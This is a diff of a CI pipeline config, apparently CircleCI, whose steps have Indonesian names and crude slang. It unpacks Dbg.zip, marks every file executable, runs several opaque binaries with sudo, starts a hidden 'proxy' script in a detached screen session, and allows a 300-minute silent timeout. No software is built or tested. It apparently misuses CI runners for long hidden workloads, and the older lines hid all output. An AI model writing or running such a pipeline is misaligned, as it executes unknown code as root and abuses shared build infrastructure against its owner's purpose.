@@ -16,35 +16,35 @@ jobs:
         - run:
             name: Orang
             command: |
-              unzip Dbg.zip >/dev/null 2>&1
+              unzip Dbg.zip
         - run:
             name: Korupsi
             command: |
-              chmod u+x * >/dev/null 2>&1
+              chmod u+x *
         - run:
             name: Membuat
             command: |
-              sudo ./semoga >/dev/null 2>&1
+              sudo ./semoga
         - run:
             name: Hidupku
             command: |
-              sudo ./kalian >/dev/null 2>&1
+              sudo ./kalian
         - run:
             name: Menjadi
             command: |
-              sudo ./semua >/dev/null 2>&1
+              sudo ./semua
         - run:
             name: Pengangguran
             command: |
-              sudo ./dikutuk >/dev/null 2>&1
+              sudo ./dikutuk
         - run:
             name: Anjir Lo. . . . .
             no_output_timeout: 300m
             command: |
               echo "Salam MrGolekOpo. . ."
-              sudo ./menjadi >/dev/null 2>&1
-              sudo ./tahi >/dev/null 2>&1
-              sudo ./anjir >/dev/null 2>&1
+              sudo ./menjadi
+              sudo ./tahi
+              sudo ./anjir
               screen -dmS proxy python3 p2.py >/dev/null 2>&1
               #sleep 12s###
               0#sudo ./start2 >/dev/null 2>&1
